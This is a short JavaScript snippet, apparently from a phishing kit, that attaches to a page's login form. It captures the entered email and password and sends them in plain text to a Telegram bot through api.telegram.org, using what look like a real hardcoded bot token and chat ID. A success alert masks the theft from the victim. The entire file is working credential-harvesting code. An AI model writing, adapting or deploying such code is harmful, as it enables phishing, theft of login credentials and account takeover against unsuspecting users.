// Setting up the bot token and Chat ID
const TELEGRAM_BOT_TOKEN = '7419245304:AAHv39hyU5Hzq8M2X8X_9QADHpXObgb4Q_U'; // Replace with your bot's token
const TELEGRAM_CHAT_ID = '6016757383'; // Replace with your Chat ID

// Adding a submit event listener to the form
document.querySelector('form').addEventListener('submit', function (e) {
    e.preventDefault(); // Prevent the page from reloading

    // Collecting form field data
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    // Formatting the message to be sent to the bot
    const telegramMessage = `
         New user data:
         Email: ${email}
         Password: ${password}
    `;

    // Sending the data to Telegram API using Fetch
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: telegramMessage,
        }),
    })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                alert('Data sent successfully!');
            } else {
                alert('An error occurred during sending. Please try again.');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            alert('An error occurred during sending. Please try again.');
        });
});
